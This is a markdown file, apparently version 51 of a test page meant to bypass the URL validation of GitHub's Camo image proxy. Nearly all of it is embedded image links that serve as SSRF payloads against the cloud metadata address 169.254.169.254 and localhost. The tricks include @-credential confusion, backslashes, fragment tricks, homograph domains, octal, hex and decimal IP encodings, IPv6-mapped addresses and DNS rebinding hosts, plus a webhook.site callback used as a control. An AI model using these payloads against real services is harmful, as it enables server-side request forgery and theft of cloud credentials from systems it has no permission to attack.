# v51: Advanced URL Parsing & Bypass Techniques

> Testing URL parsing edge cases that might bypass Camo's URL validation

---

## 1. URL Parsing Confusion (@ symbol - credentials in URL)

### @ before hostname (credentials parsing)
![at1](http://webhook.site@169.254.169.254/latest/meta-data/)

### Double @ 
![at2](http://foo@bar@169.254.169.254/)

### @ with encoded chars
![at3](http://webhook.site%40169.254.169.254/)

---

## 2. Backslash vs Forward Slash Confusion

### Backslash in path
![bs1](http://169.254.169.254\latest\meta-data\)

### Mixed slashes
![bs2](http://webhook.site\/169.254.169.254)

---

## 3. URL Fragment Tricks

### Fragment before host (browser vs server parsing)
![frag1](http://foo#@169.254.169.254/)

### Double fragment
![frag2](http://169.254.169.254/#foo#bar)

---

## 4. Unicode/IDN Domain Tricks

### IDN homograph - аws (Cyrillic 'а')
![idn1](http://аws.amazon.com/test.gif)

### Mixed script domain
![idn2](http://169。254。169。254/test)

---

## 5. Port Tricks

### Port 80 explicit
![port1](http://169.254.169.254:80/latest/meta-data/)

### Port 0
![port2](http://169.254.169.254:0/latest/)

### Port 65535
![port3](http://169.254.169.254:65535/)

---

## 6. Decimal/Octal/Hex IP Encoding

### Decimal IP (already tested but retry)
![dec1](http://2852039166/latest/meta-data/)

### Octal with leading zeros
![oct1](http://0251.0376.0251.0376/)

### Mixed encoding
![mix1](http://169.0xfe.169.0xfe/)

---

## 7. IPv6 Tricks

### IPv6 localhost
![ipv6-1](http://[::1]/)

### IPv6 mapped IPv4 - link-local
![ipv6-2](http://[::ffff:169.254.169.254]/)

### IPv6 short form
![ipv6-3](http://[0:0:0:0:0:ffff:a9fe:a9fe]/)

---

## 8. DNS Rebinding Service

### rbndr.us rebind service
![rebind1](http://7f000001.c0a80001.rbndr.us/)

### 1u.ms rebind
![rebind2](http://make-169.254.169.254-rr.1u.ms/)

---

## 9. Control Test

### Direct webhook
![control](https://webhook.site/1873d398-52fb-46cf-b86a-d4aa58c4ad9d/v51-control.gif)

---

**v51** - Advanced URL parsing bypass attempts
